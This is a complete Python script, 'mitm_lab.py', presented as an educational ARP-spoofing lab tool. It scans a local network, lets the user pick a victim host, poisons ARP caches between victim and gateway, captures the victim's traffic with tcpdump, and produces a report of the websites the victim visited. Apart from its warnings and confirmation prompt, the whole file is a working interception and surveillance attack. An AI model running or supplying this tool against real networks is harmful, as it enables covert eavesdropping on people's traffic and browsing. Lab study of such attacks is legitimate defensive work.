#!/usr/bin/env python3
"""
mitm_lab.py - Educational ARP Spoofing / MITM lab tool
Version: 3.0.1

WARNING: Use ONLY on networks you own or have explicit written
permission to test. Unauthorized use is illegal in most countries.
"""
import argparse
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

# ============================================================
# Constants
# ============================================================
C = {
    'RED': '\033[0;31m', 'GREEN': '\033[0;32m', 'YELLOW': '\033[1;33m',
    'BLUE': '\033[0;34m', 'CYAN': '\033[0;36m', 'BOLD': '\033[1m',
    'NC': '\033[0m',
}

BANNER = """
  ╔══════════════════════════════════════════════════╗
  ║      MITM Lab — Educational ARP Spoofing Tool     ║
  ║           v3.0.1 · For authorized labs only       ║
  ╚══════════════════════════════════════════════════╝
"""

PCAP_SIZE_MB = 100
PCAP_MAX_FILES = 10


# ============================================================
# Logging helpers
# ============================================================
def info(m):  print(f"{C['BLUE']}[*]{C['NC']} {m}")
def ok(m):    print(f"{C['GREEN']}[+]{C['NC']} {m}")
def warn(m):  print(f"{C['YELLOW']}[!]{C['NC']} {m}")
def err(m):   print(f"{C['RED']}[-]{C['NC']} {m}", file=sys.stderr)
def die(m):
    err(m)
    sys.exit(1)


def human_size(n: int) -> str:
    for unit in ('B', 'KB', 'MB', 'GB', 'TB'):
        if n < 1024:
            return f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} PB"


def run_cmd(cmd: list, timeout: int = 60, **kw) -> subprocess.CompletedProcess:
    """Run a command silently; never raise on non-zero exit."""
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout, **kw)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, 124, "", "timeout")


def is_locally_administered(mac: str) -> bool:
    """Detect MAC randomization (locally administered bit)."""
    if not mac or mac == "(unknown)":
        return False
    first = mac.split(':')[0]
    if not re.match(r'^[0-9a-fA-F]{2}$', first):
        return False
    return bool(int(first, 16) & 2)


def guess_device_type(vendor: str) -> str:
    if not vendor:
        return ""
    v = vendor.lower()
    rules = [
        ('Router/AP',   ['cisco', 'juniper', 'mikrotik', 'ubiquiti', 'aruba',
                         'netgear', 'tp-link', 'd-link']),
        ('Phone/Tablet', ['apple', 'samsung', 'xiaomi', 'oneplus', 'huawei',
                          'oppo', 'vivo', 'nokia', 'motorola', 'sony', 'lg']),
        ('Printer',     ['hp', 'brother', 'canon', 'epson', 'xerox',
                         'lexmark', 'ricoh']),
        ('IoT',         ['espressif', 'realtek', 'tuya', 'sonoff', 'texas']),
        ('VM',          ['vmware', 'virtualbox', 'qemu', 'xen']),
        ('PC/Laptop',   ['intel', 'dell', 'lenovo', 'asus', 'acer', 'msi',
                         'gigabyte', 'hewlett', 'micro-star']),
        ('SBC',         ['raspberry']),
    ]
    for label, keys in rules:
        if any(k in v for k in keys):
            return label
    return ""


# ============================================================
# Main class
# ============================================================
class MitmLab:
    def __init__(self, args):
        self.args = args
        # Network state
        self.iface: Optional[str] = None
        self.gateway: Optional[str] = None
        self.my_ip: Optional[str] = None
        self.victim: Optional[str] = None
        self.victim_mac: Optional[str] = None
        self.orig_forward: Optional[str] = None
        # Session
        self.session_dir: Optional[str] = None
        self.pcap_file: Optional[str] = None
        self.real_user: Optional[str] = None
        self.real_home: Optional[str] = None
        # Processes
        self.arpspoof_procs: list = []
        self.tcpdump_proc: Optional[subprocess.Popen] = None
        # Flags
        self.stopping = False
        self.cleaned = False
        # Data
        self.hosts: list = []
        self.host_macs: dict = {}
        self.vendor_cache: dict = {}
        self.vendor_db: dict = {}
        self.vendor_db_path: Optional[str] = None

    # ---------- Vendor DB ----------
    def _load_vendor_db(self):
        candidates = [
            ("/usr/share/nmap/nmap-mac-prefixes", self._parse_nmap),
            ("/usr/share/ieee-data/oui.txt",      self._parse_ieee),
            ("/usr/share/wireshark/manuf",        self._parse_wireshark),
        ]
        for path, parser in candidates:
            if Path(path).exists():
                try:
                    with open(path, 'r', errors='ignore') as f:
                        db = parser(f)
                    if db:
                        return db, path
                except Exception:
                    continue
        return {}, None

    @staticmethod
    def _parse_nmap(f):
        db = {}
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(None, 1)
            if len(parts) == 2 and len(parts[0]) == 6:
                db[parts[0].upper()] = parts[1]
        return db

    @staticmethod
    def _parse_ieee(f):
        db = {}
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) >= 2 and len(parts[0]) == 6:
                db[parts[0].upper()] = parts[1]
        return db

    @staticmethod
    def _parse_wireshark(f):
        db = {}
        for line in f:
            if line.startswith('#'):
                continue
            parts = line.strip().split('\t')
            if len(parts) >= 2 and ':' in parts[0]:
                oui = parts[0].replace(':', '').upper()[:6]
                db[oui] = parts[1]
        return db

    def lookup_vendor(self, mac: str) -> str:
        if not mac or mac == "(unknown)":
            return ""
        if is_locally_administered(mac):
            return "(randomized)"
        if mac in self.vendor_cache:
            return self.vendor_cache[mac]
        oui = mac.upper().replace(':', '')[:6]
        vendor = self.vendor_db.get(oui, "")
        self.vendor_cache[mac] = vendor
        return vendor

    def format_vendor_col(self, mac: str) -> str:
        """Column content: '<vendor> (<type>)' — truncate vendor, not type."""
        if not mac or mac == "(unknown)":
            return "—"
        if is_locally_administered(mac):
            return "randomized"
        vendor = self.lookup_vendor(mac)
        if not vendor:
            return "unknown"
        dtype = guess_device_type(vendor)
        # Truncate the vendor name (keep the type readable)
        max_vendor = 18
        if len(vendor) > max_vendor:
            vendor = vendor[:max_vendor - 3] + "..."
        return f"{vendor} ({dtype})" if dtype else vendor

    # ---------- Pre-flight ----------
    def check_root(self):
        if os.geteuid() != 0:
            die(f"Must run as root: sudo {sys.argv[0]}")
        self.real_user = os.environ.get('SUDO_USER', os.environ.get('USER', 'root'))
        if self.real_user == 'root':
            warn("Running as root directly; outputs will go to /root")
        try:
            import pwd
            self.real_home = pwd.getpwnam(self.real_user).pw_dir
        except KeyError:
            die(f"Cannot find user: {self.real_user}")
        if not self.real_home or not Path(self.real_home).is_dir():
            die(f"Cannot determine home for {self.real_user}")
        ok(f"Root privileges confirmed (real user: {self.real_user})")

    def check_tools(self):
        missing = [t for t in ('arpspoof', 'tcpdump', 'ip', 'sysctl')
                   if not shutil.which(t)]
        if not shutil.which('nmap') and not shutil.which('arp-scan'):
            missing.append("nmap or arp-scan")
        if missing:
            err(f"Missing tools: {', '.join(missing)}")
            print(f"   Install: {C['CYAN']}sudo apt install dsniff tcpdump nmap iproute2{C['NC']}")
            sys.exit(1)
        ok("All required tools present")

        if not shutil.which('tshark'):
            if self.args.no_analyze:
                info("tshark not found (analysis disabled — fine)")
            else:
                warn("tshark not found — website analysis will be skipped")
        else:
            ok("tshark found (website analysis enabled)")

        self.vendor_db, self.vendor_db_path = self._load_vendor_db()
        if self.vendor_db_path:
            ok(f"MAC vendor DB: {self.vendor_db_path} ({len(self.vendor_db)} entries)")
        else:
            warn("No MAC vendor DB found — vendor column will show 'unknown'")

    # ---------- Network detection ----------
    def detect_network(self):
        if self.args.iface_override:
            self.iface = self.args.iface_override
            if run_cmd(['ip', 'link', 'show', self.iface]).returncode != 0:
                die(f"Interface not found: {self.iface}")
        else:
            r = run_cmd(['ip', '-4', 'route', 'show', 'default'])
            m = re.search(r'default via (\S+) dev (\S+)', r.stdout)
            if not m:
                die("No default network interface found")
            self.iface = m.group(2)

        if self.args.gateway_override:
            self.gateway = self.args.gateway_override
        else:
            r = run_cmd(['ip', '-4', 'route', 'show', 'default', 'dev', self.iface])
            m = re.search(r'default via (\S+)', r.stdout)
            if not m:
                die(f"No default gateway found on {self.iface}")
            self.gateway = m.group(1)

        r = run_cmd(['ip', '-4', 'addr', 'show', self.iface])
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+/\d+)', r.stdout)
        if not m:
            die(f"No IPv4 address on {self.iface}")
        cidr = m.group(1)
        self.my_ip = cidr.split('/')[0]

        ok(f"Interface : {C['BOLD']}{self.iface}{C['NC']}")
        ok(f"Your IP   : {C['BOLD']}{cidr}{C['NC']}")
        ok(f"Gateway   : {C['BOLD']}{self.gateway}{C['NC']}")

        if self.iface.startswith('wl'):
            warn("WiFi interface detected — ARP spoofing may be unreliable on wireless")
            warn("  Common cause: AP isolation on public/corporate networks.")

    def on_local_subnet(self, ip: str) -> bool:
        r = run_cmd(['ip', '-4', 'route', 'get', ip], timeout=5)
        return ' via ' not in r.stdout

    def get_mac(self, ip: str) -> Optional[str]:
        r = run_cmd(['ip', 'neigh', 'show', ip], timeout=5)
        m = re.search(r'lladdr (\S+)', r.stdout)
        return m.group(1) if m else None

    def get_interface_mac(self) -> Optional[str]:
        """Read our own interface MAC directly (for MY_IP display)."""
        if not self.iface:
            return None
        r = run_cmd(['ip', 'link', 'show', self.iface], timeout=5)
        m = re.search(r'link/ether (\S+)', r.stdout)
        return m.group(1) if m else None

    # ---------- Scanning ----------
    def scan_network(self):
        r = run_cmd(['ip', '-4', 'addr', 'show', self.iface])
        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+/\d+)', r.stdout)
        if not m:
            die(f"Cannot determine subnet for {self.iface}")
        cidr = m.group(1)
        ip_part, prefix_len = cidr.split('/')
        info(f"Scanning network ({cidr}), please wait...")

        seen_ips, seen_macs = set(), {}

        # arp-scan, 3 passes
        if shutil.which('arp-scan'):
            for n in (1, 2, 3):
                info(f"ARP scan pass {n}/3...")
                r = run_cmd(['arp-scan', f'--interface={self.iface}',
                             '--localnet', '--retry=3'], timeout=120)
                for line in r.stdout.splitlines():
                    mm = re.match(r'^(\d+\.\d+\.\d+\.\d+)\s+(\S+)', line)
                    if mm:
                        seen_ips.add(mm.group(1))
                        seen_macs[mm.group(1)] = mm.group(2)

        # nmap fallback
        if not seen_ips and shutil.which('nmap'):
            for n in (1, 2, 3):
                info(f"nmap scan pass {n}/3...")
                r = run_cmd(['nmap', '-sn', '-n', '-PR', cidr], timeout=180)
                for mm in re.finditer(r'(\d+\.\d+\.\d+\.\d+)', r.stdout):
                    seen_ips.add(mm.group(1))

        # Optional ping sweep
        if self.args.wake and prefix_len == '24':
            base = '.'.join(ip_part.split('.')[:3])
            info(f"Ping sweep ({base}.1-254) to wake sleeping hosts...")
            procs = []
            for i in range(1, 255):
                try:
                    procs.append(subprocess.Popen(
                        ['ping', '-c', '1', '-W', '1', f'{base}.{i}'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                except Exception:
                    pass
            for p in procs:
                try:
                    p.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    p.kill()

        # Merge ARP cache — ONLY resolved entries (with lladdr)
        prefix = '.'.join(ip_part.split('.')[:3]) + '.'
        r = run_cmd(['ip', 'neigh', 'show', 'dev', self.iface], timeout=10)
        for line in r.stdout.splitlines():
            parts = line.split()
            if not parts or not parts[0].startswith(prefix):
                continue
            mm = re.search(r'lladdr (\S+)', line)
            if not mm:
                continue  # skip INCOMPLETE/FAILED/NOARP
            seen_ips.add(parts[0])
            seen_macs.setdefault(parts[0], mm.group(1))

        # Always include self & gateway
        seen_ips.add(self.my_ip)
        seen_ips.add(self.gateway)

        # Own interface MAC (in case ARP doesn't know us)
        self_mac = self.get_interface_mac()
        if self_mac:
            seen_macs[self.my_ip] = self_mac

        # Sort numerically
        self.hosts = sorted(seen_ips, key=lambda s: tuple(int(x) for x in s.split('.')))
        self.host_macs = seen_macs
        if not self.hosts:
            die("No hosts discovered")

        # Display
        print()
        print(f"{C['BOLD']}Discovered hosts:{C['NC']} {C['CYAN']}({len(self.hosts)} found){C['NC']}")
        print(f"   {'#':<3} {'IP':<16} {'MAC':<20} {'Vendor (Type)':<32} Note")
        print("   " + "-" * 80)
        for i, h in enumerate(self.hosts, 1):
            mac = self.host_macs.get(h) or self.get_mac(h) or "(unknown)"
            note = ""
            if h == self.gateway:
                note = "<- Gateway (do not attack)"
            elif h == self.my_ip:
                note = "<- You"
            elif not self.on_local_subnet(h):
                note = "<- routed (not on-link)"
            print(f"   {i:<3} {h:<16} {mac:<20} {self.format_vendor_col(mac):<32} {note}")

        if prefix_len == '24' and len(self.hosts) < 3:
            warn(f"Only {len(self.hosts)} host(s) found. On WiFi hotspots, AP isolation hides devices.")
            warn(f"  Try {C['CYAN']}--wake{C['NC']} to ping-sweep.")

    # ---------- Victim ----------
    def _resolve_victim_mac(self, ip: str) -> Optional[str]:
        """Prefer the MAC we saw during scan; fall back to ARP cache."""
        return self.host_macs.get(ip) or self.get_mac(ip)

    def choose_victim(self) -> bool:
        if self.args.victim:
            self.victim = self.args.victim
            if not self.on_local_subnet(self.victim):
                die(f"Victim {self.victim} is not on the local subnet")
            if self.victim == self.gateway:
                die("Victim is the gateway")
            if self.victim == self.my_ip:
                die("Victim is your own IP")
            # FIX 1a: prefer scan MAC over fresh ARP query
            self.victim_mac = self._resolve_victim_mac(self.victim)
            ok(f"Victim (from --victim): {self.victim} ({self.victim_mac or 'unknown'})")
            return True

        if self.args.auto:
            for h in self.hosts:
                if h not in (self.my_ip, self.gateway) and self.on_local_subnet(h):
                    self.victim = h
                    break
            if not self.victim:
                die("Auto mode: no suitable victim found")
            # FIX 1b
            self.victim_mac = self._resolve_victim_mac(self.victim)
            ok(f"Auto-selected victim: {self.victim} ({self.victim_mac or 'unknown'})")
            return True

        print()
        while True:
            try:
                choice = input(f"{C['BOLD']}Select victim number (q to quit): {C['NC']}").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                info("Aborted.")
                return False
            if not choice:
                continue
            if choice.lower() == 'q':
                info("Aborted.")
                return False
            if not choice.isdigit() or not (1 <= int(choice) <= len(self.hosts)):
                err("Invalid number.")
                continue
            pick = self.hosts[int(choice) - 1]
            if pick == self.my_ip:
                err("That's you!")
                continue
            if pick == self.gateway:
                err("That's the gateway!")
                continue
            if not self.on_local_subnet(pick):
                warn(f"Host {pick} is routed. ARP spoofing likely to fail.")
                try:
                    c = input(f"{C['BOLD']}Continue anyway? [y/N]: {C['NC']}").strip()
                except (KeyboardInterrupt, EOFError):
                    return False
                if c.lower() != 'y':
                    continue
            self.victim = pick
            break

        # FIX 1c: use cached MAC first
        self.victim_mac = self._resolve_victim_mac(self.victim)
        ok(f"Victim: {C['BOLD']}{self.victim}{C['NC']} ({self.victim_mac or 'MAC unknown'})")
        return True

    def ensure_victim_mac(self):
        if not self.victim_mac or self.victim_mac == "(unknown)":
            info("Victim MAC unknown, probing...")
            run_cmd(['ping', '-c', '1', '-W', '2', self.victim], timeout=10)
            self.victim_mac = self.get_mac(self.victim)
        if not self.victim_mac:
            warn(f"Could not resolve MAC for {self.victim}")
            try:
                c = input(f"{C['BOLD']}Proceed anyway? [y/N]: {C['NC']}").strip()
            except (KeyboardInterrupt, EOFError):
                sys.exit(0)
            if c.lower() != 'y':
                info("Aborted.")
                sys.exit(0)
        else:
            # FIX 2: no more "((randomized))" — clean single-paren output
            vendor = self.lookup_vendor(self.victim_mac)
            dtype = guess_device_type(vendor)
            if vendor == "(randomized)":
                desc = "randomized MAC"
            elif vendor and dtype:
                desc = f"{vendor} — {dtype}"
            elif vendor:
                desc = vendor
            else:
                desc = "unknown vendor"
            ok(f"Victim MAC resolved: {self.victim_mac}  ({desc})")

    def confirm(self) -> bool:
        print()
        print(f"{C['BOLD']}========================================{C['NC']}")
        print(f"{C['BOLD']}  Attack Configuration{C['NC']}")
        print(f"{C['BOLD']}========================================{C['NC']}")
        print(f"  Interface   : {self.iface}")
        print(f"  Your IP     : {self.my_ip}")
        print(f"  Gateway     : {self.gateway}")
        print(f"  Victim      : {self.victim} ({self.victim_mac or 'unknown'})")
        if self.victim_mac:
            v = self.lookup_vendor(self.victim_mac)
            t = guess_device_type(v)
            if v and v != "(randomized)":
                print(f"  Vendor      : {v}{f' ({t})' if t else ''}")
        print(f"  Duration    : {self.args.duration}s" if self.args.duration > 0
              else "  Duration    : unlimited (Ctrl+C to stop)")
        print(f"  Analysis    : {'disabled' if self.args.no_analyze else 'enabled'}")
        if self.iface.startswith('wl'):
            print(f"  {C['YELLOW']}⚠  WiFi: ARP spoofing may fail due to AP isolation{C['NC']}")
        print(f"{C['BOLD']}========================================{C['NC']}")
        print()
        warn("This must be a network you own or have written permission to test.")
        try:
            ans = input(f"{C['BOLD']}Type 'yes' to continue: {C['NC']}").strip()
        except (KeyboardInterrupt, EOFError):
            print()
            return False
        return ans == "yes"

    # ---------- Session helpers ----------
    def pcap_files(self):
        return sorted(Path(self.session_dir).glob("capture.pcap*")) if self.session_dir else []

    def capture_total_size(self) -> int:
        return sum(p.stat().st_size for p in self.pcap_files() if p.is_file())

    def count_packets(self) -> int:
        total = 0
        for p in self.pcap_files():
            try:
                r = run_cmd(['tcpdump', '-r', str(p), '-nn'], timeout=120)
                total += len(r.stdout.splitlines())
            except subprocess.TimeoutExpired:
                pass
        return total

    def _start_tcpdump(self, append=False) -> bool:
        log_path = Path(self.session_dir) / "tcpdump.log"
        log_fp = open(log_path, 'a' if append else 'w')
        try:
            self.tcpdump_proc = subprocess.Popen(
                ['tcpdump', '-i', self.iface, '-U', '-w', self.pcap_file,
                 f'host {self.victim}'],
                stdout=log_fp, stderr=subprocess.STDOUT)
            log_fp.close()
        except Exception as e:
            err(f"Failed to start tcpdump: {e}")
            log_fp.close()
            return False
        time.sleep(2)
        if self.tcpdump_proc.poll() is not None:
            err("tcpdump failed to start! Log:")
            try:
                print(log_path.read_text(), file=sys.stderr)
            except Exception:
                pass
            return False
        return True

    def rotate_pcap(self) -> bool:
        if not self.tcpdump_proc or not self.pcap_file:
            return True
        try:
            size = Path(self.pcap_file).stat().st_size
        except FileNotFoundError:
            return True
        if size <= PCAP_SIZE_MB * 1024 * 1024:
            return True

        self.tcpdump_proc.terminate()
        try:
            self.tcpdump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.tcpdump_proc.kill()

        new_name = f"{self.pcap_file}.{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        try:
            Path(self.pcap_file).rename(new_name)
            ok(f"Rotated: {Path(new_name).name} ({human_size(size)})")
        except OSError as e:
            warn(f"Rotation failed: {e}")
            return False

        rotations = sorted([p for p in self.pcap_files() if p.name != "capture.pcap"],
                           key=lambda p: p.stat().st_mtime)
        while len(rotations) > PCAP_MAX_FILES:
            try:
                rotations.pop(0).unlink()
            except OSError:
                pass
        return self._start_tcpdump(append=True)

    # ---------- Attack ----------
    def run_attack(self):
        base = Path(self.real_home) / "mitm_lab_sessions"
        base.mkdir(parents=True, exist_ok=True)
        self.session_dir = str(base / datetime.now().strftime("%Y%m%d_%H%M%S"))
        Path(self.session_dir).mkdir(parents=True, exist_ok=True)
        self.pcap_file = str(Path(self.session_dir) / "capture.pcap")
        ok(f"Session directory: {self.session_dir}")

        self.orig_forward = run_cmd(['sysctl', '-n', 'net.ipv4.ip_forward']).stdout.strip() or "0"
        info(f"Original ip_forward: {self.orig_forward}")

        try:
            free_mb = shutil.disk_usage(self.session_dir).free // (1024 * 1024)
            if free_mb < 500:
                warn(f"Low disk space: {free_mb} MB free")
        except Exception:
            pass

        if self.args.dry_run:
            warn("DRY RUN — no changes will be made")
            print(f"Would run: sysctl -w net.ipv4.ip_forward=1")
            print(f"Would run: arpspoof -i {self.iface} -t {self.victim} {self.gateway}")
            print(f"Would run: arpspoof -i {self.iface} -t {self.gateway} {self.victim}")
            print(f"Would run: tcpdump -i {self.iface} -U -w {self.pcap_file} host {self.victim}")
            shutil.rmtree(self.session_dir, ignore_errors=True)
            self.session_dir = None
            return

        run_cmd(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        if run_cmd(['sysctl', '-n', 'net.ipv4.ip_forward']).stdout.strip() != '1':
            die("Failed to enable ip_forward — aborting to avoid DoS")
        ok("Enabled ip_forward=1")

        info("Starting ARP spoofing (both directions)...")
        for direction, target, spoof_as in [
            ('victim',  self.victim,  self.gateway),
            ('gateway', self.gateway, self.victim),
        ]:
            log_path = Path(self.session_dir) / f"arpspoof_{direction}.log"
            log_fp = open(log_path, 'w')
            try:
                proc = subprocess.Popen(
                    ['arpspoof', '-i', self.iface, '-t', target, spoof_as],
                    stdout=log_fp, stderr=subprocess.STDOUT)
                log_fp.close()
                self.arpspoof_procs.append(proc)
            except Exception as e:
                log_fp.close()
                die(f"Failed to start arpspoof: {e}")

        time.sleep(2)
        for proc in self.arpspoof_procs:
            if proc.poll() is not None:
                die("arpspoof failed — check logs")
        ok(f"arpspoof running (PIDs: {[p.pid for p in self.arpspoof_procs]})")

        info(f"Starting capture -> {self.pcap_file}")
        if not self._start_tcpdump(append=False):
            die("tcpdump failure — aborting")
        ok(f"tcpdump running (PID: {self.tcpdump_proc.pid})")

        print()
        print(f"{C['GREEN']}{C['BOLD']}Attack is running.{C['NC']}")
        print(f"   {C['CYAN']}Press Ctrl+C once to stop and clean up.{C['NC']}")
        if self.args.duration > 0:
            print(f"   {C['CYAN']}Auto-stop after {self.args.duration}s.{C['NC']}")
        print()

        start = time.time()
        try:
            while not self.stopping:
                for _ in range(5):
                    if self.stopping:
                        break
                    time.sleep(1)
                if self.stopping:
                    break
                elapsed = int(time.time() - start)
                if self.args.duration > 0 and elapsed >= self.args.duration:
                    info(f"Duration limit ({self.args.duration}s) reached")
                    break
                if not self.rotate_pcap():
                    warn("Rotation failed — stopping")
                    break
                size_h = human_size(self.capture_total_size())
                sys.stdout.write(
                    f"\r{C['BLUE']}[timer]{C['NC']} "
                    f"Elapsed: {elapsed//60:02d}:{elapsed%60:02d} | "
                    f"Capture: {size_h}   ")
                sys.stdout.flush()
        except KeyboardInterrupt:
            pass
        print()

    # ---------- Cleanup ----------
    def cleanup(self):
        if self.cleaned:
            return
        self.cleaned = True
        self.stopping = True
        if not self.session_dir:
            return

        print()
        info("Cleaning up...")

        # FIX 3: distinguish "stopped" from "already exited"
        for proc in self.arpspoof_procs:
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                    ok(f"Stopped arpspoof (PID {proc.pid})")
                except subprocess.TimeoutExpired:
                    proc.kill()
                    warn(f"Force-killed arpspoof (PID {proc.pid})")
            else:
                ok(f"arpspoof (PID {proc.pid}) already exited")

        if self.tcpdump_proc:
            if self.tcpdump_proc.poll() is None:
                try:
                    self.tcpdump_proc.terminate()
                    self.tcpdump_proc.wait(timeout=5)
                    ok(f"Stopped tcpdump (PID {self.tcpdump_proc.pid})")
                except subprocess.TimeoutExpired:
                    self.tcpdump_proc.kill()
                    warn(f"Force-killed tcpdump (PID {self.tcpdump_proc.pid})")
            else:
                ok(f"tcpdump (PID {self.tcpdump_proc.pid}) already exited")

        if self.orig_forward is not None:
            run_cmd(['sysctl', '-w', f'net.ipv4.ip_forward={self.orig_forward}'])
            ok(f"Restored ip_forward={self.orig_forward}")

        if shutil.which('arping') and self.iface and self.victim and self.gateway:
            for target in (self.victim, self.gateway):
                try:
                    run_cmd(['arping', '-c', '2', '-I', self.iface, target], timeout=10)
                except subprocess.TimeoutExpired:
                    pass
            ok("Sent corrective ARP (faster recovery)")

        if Path(self.session_dir).is_dir():
            pkts = self.count_packets()
            size_h = human_size(self.capture_total_size())

            info_path = Path(self.session_dir) / "session_info.txt"
            info_path.write_text(
                "Session Summary\n===============\n"
                f"Date        : {datetime.now()}\n"
                f"Interface   : {self.iface}\n"
                f"Gateway     : {self.gateway}\n"
                f"Victim      : {self.victim} ({self.victim_mac or 'unknown'})\n"
                f"Packets     : {pkts}\n"
                f"Capture size: {size_h}\n"
                f"Capture     : {self.session_dir}/capture.pcap*\n"
            )

            if self.args.no_analyze:
                info("Website analysis disabled")
            else:
                self.analyze_capture(Path(self.session_dir) / "websites_visited.txt")

            # Hand back to real user
            if self.real_user and self.real_user != 'root':
                try:
                    import pwd
                    pw = pwd.getpwnam(self.real_user)
                    for root, dirs, files in os.walk(self.session_dir):
                        for d in dirs:
                            os.chown(os.path.join(root, d), pw.pw_uid, pw.pw_gid)
                        for f in files:
                            os.chown(os.path.join(root, f), pw.pw_uid, pw.pw_gid)
                    os.chown(self.session_dir, pw.pw_uid, pw.pw_gid)
                except Exception:
                    pass

            print()
            print(f"{C['BOLD']}Session directory:{C['NC']} {self.session_dir}")
            for p in sorted(Path(self.session_dir).iterdir()):
                try:
                    print(f"   {p.name} ({human_size(p.stat().st_size)})")
                except Exception:
                    pass
            ok(f"Total packets captured: {pkts}")

        print()
        ok("All processes stopped. Network restored.")

    # ---------- Analysis ----------
    def analyze_capture(self, out_path: Path):
        if not shutil.which('tshark'):
            warn("tshark not installed — analysis skipped")
            return
        files = self.pcap_files()
        if not files:
            warn("No capture files — skipping analysis")
            return

        info("Analyzing captured traffic...")
        total_pkts = self.count_packets()
        total_size = human_size(self.capture_total_size())

        http_pairs = set()
        for f in files:
            r = run_cmd(['tshark', '-r', str(f), '-Y', 'http.request',
                         '-T', 'fields', '-e', 'http.host',
                         '-e', 'http.request.uri'], timeout=300)
            for line in r.stdout.splitlines():
                parts = line.split('\t')
                if not parts or not parts[0]:
                    continue
                uri = parts[1] if len(parts) > 1 and parts[1] else '/'
                http_pairs.add((parts[0], uri))

        https_counts = {}
        for f in files:
            r = run_cmd(['tshark', '-r', str(f), '-Y', 'tls.handshake.type==1',
                         '-T', 'fields',
                         '-e', 'tls.handshake.extensions_server_name'], timeout=300)
            for line in r.stdout.splitlines():
                name = line.strip()
                if name and name != ',':
                    https_counts[name] = https_counts.get(name, 0) + 1

        lines = ["=" * 56,
                 "  Websites Visited by Victim",
                 f"  Session : {Path(self.session_dir).name}",
                 f"  Date    : {datetime.now()}",
                 f"  Victim  : {self.victim} ({self.victim_mac or 'unknown'})",
                 f"  Packets : {total_pkts}",
                 f"  Capture : {total_size}",
                 "=" * 56, "",
                 "--- HTTP Requests (grouped by domain) ---"]

        if not http_pairs:
            lines.append("  (no plaintext HTTP traffic found)")
        else:
            by_host = {}
            for host, uri in http_pairs:
                by_host.setdefault(host, []).append(uri)
            for host in sorted(by_host):
                # FIX 5: flag raw IP:port hosts (no Host header)
                is_raw_ip = bool(re.match(r'^\d+\.\d+\.\d+\.\d+(:\d+)?$', host))
                marker = "  ← raw IP, no Host header" if is_raw_ip else ""
                lines.append(f"\n  [{host}]{marker}")
                for uri in sorted(by_host[host]):
                    lines.append(f"     {uri}")

        lines += ["", "--- HTTPS Domains (from TLS SNI, with visit count) ---"]
        if not https_counts:
            lines.append("  (no TLS SNI found — encrypted, IP-only, or ECH)")
        else:
            for name, count in sorted(https_counts.items(), key=lambda x: (-x[1], x[0])):
                bar = "▓" * min(count, 25)
                lines.append(f"  {count:4d}  {bar:<25}  {name}")

        lines += ["", "=" * 56, "  Summary", "=" * 56,
                  f"  HTTP   : {len(http_pairs)} unique URLs",
                  f"  HTTPS  : {len(https_counts)} unique domains",
                  "  Note   : HTTPS paths are encrypted; only SNI is visible.",
                  "=" * 56]

        out_path.write_text("\n".join(lines) + "\n")
        ok(f"Website report: {out_path}")
        try:
            print()
            print(out_path.read_text())
        except Exception:
            pass

    # ---------- Main flow ----------
    def run(self) -> int:
        print(f"{C['CYAN']}{C['BOLD']}{BANNER}{C['NC']}")
        self.check_root()
        self.check_tools()
        self.detect_network()

        if self.args.check:
            if run_cmd(['ping', '-c', '1', '-W', '1', self.gateway],
                       timeout=5).returncode == 0:
                ok("Gateway is reachable")
            else:
                warn("Gateway did not respond to ping")
            print()
            ok("All checks passed — ready to run.")
            return 0

        if not self.args.victim:
            self.scan_network()
        else:
            info("Skipping scan (victim provided)")

        if not self.choose_victim():
            return 0
        self.ensure_victim_mac()
        if not self.confirm():
            return 0
        self.run_attack()
        return 0


# ============================================================
# CLI
# ============================================================
def build_parser():
    p = argparse.ArgumentParser(
        description="Educational ARP Spoofing / MITM lab tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="WARNING: Use ONLY on networks you own or have explicit permission to test.")
    p.add_argument('--dry-run',    action='store_true')
    p.add_argument('--check',      action='store_true')
    p.add_argument('--auto',       action='store_true')
    p.add_argument('--explain',    action='store_true')
    p.add_argument('--no-analyze', action='store_true')
    p.add_argument('--wake',       action='store_true')
    p.add_argument('--duration',   type=int, default=0)
    p.add_argument('--victim')
    p.add_argument('--interface',  dest='iface_override')
    p.add_argument('--gateway',    dest='gateway_override')
    p.add_argument('--version',    action='version', version='mitm_lab.py 3.0.1')
    return p


def main():
    lab = MitmLab(build_parser().parse_args())

    def _term(signum, frame):
        lab.stopping = True

    signal.signal(signal.SIGTERM, _term)
    try:
        sys.exit(lab.run())
    except KeyboardInterrupt:
        print()
        info("Interrupted")
        sys.exit(130)
    finally:
        lab.cleanup()


if __name__ == '__main__':
    main()
